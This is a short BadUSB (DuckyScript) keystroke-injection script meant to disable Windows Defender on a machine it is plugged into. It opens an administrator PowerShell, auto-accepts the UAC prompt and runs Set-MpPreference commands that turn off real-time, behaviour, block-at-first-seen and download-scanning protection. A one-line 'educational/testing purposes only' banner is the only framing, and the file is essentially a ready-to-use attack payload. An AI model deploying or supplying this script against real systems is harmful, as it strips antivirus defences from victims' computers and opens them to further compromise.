REM ============================================
REM BadUSB Script: Disable Windows Defender
REM WARNING: For educational/testing purposes only!
REM ============================================

DEFAULT_DELAY 100
DELAY 500

REM Open PowerShell as Admin
GUI r
DELAY 500
STRING powershell
CTRL-SHIFT ENTER
DELAY 1500

REM Handle UAC
ALT y
DELAY 1000

REM Disable Real-time Protection
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
DELAY 500

REM Disable other protections
STRING Set-MpPreference -DisableBehaviorMonitoring $true
ENTER
STRING Set-MpPreference -DisableBlockAtFirstSeen $true
ENTER
STRING Set-MpPreference -DisableIOAVProtection $true
ENTER

REM Confirm
STRING Write-Host "Windows Defender protections disabled" -ForegroundColor Red
ENTER
